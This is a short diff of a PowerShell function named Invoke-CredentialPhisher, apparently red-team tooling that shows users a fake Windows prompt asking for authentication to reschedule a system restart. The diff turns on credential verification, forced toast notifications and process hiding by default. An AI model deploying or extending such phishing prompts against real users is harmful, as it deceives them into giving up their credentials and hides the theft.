@@ -122,13 +122,13 @@ function Invoke-CredentialPhisher {
         $CredBoxMessage = "Authentication is required to reschedule a system restart",
 
         [switch]
-        $VerifyCreds = $false,
+        $VerifyCreds = $true,
 
         [switch]
-        $EnableToastNotificationsIfDisabled = $false,
+        $EnableToastNotificationsIfDisabled = $true,
 
         [switch]
-        $HideProcesses = $false
+        $HideProcesses = $true
     )
 
     #region functions
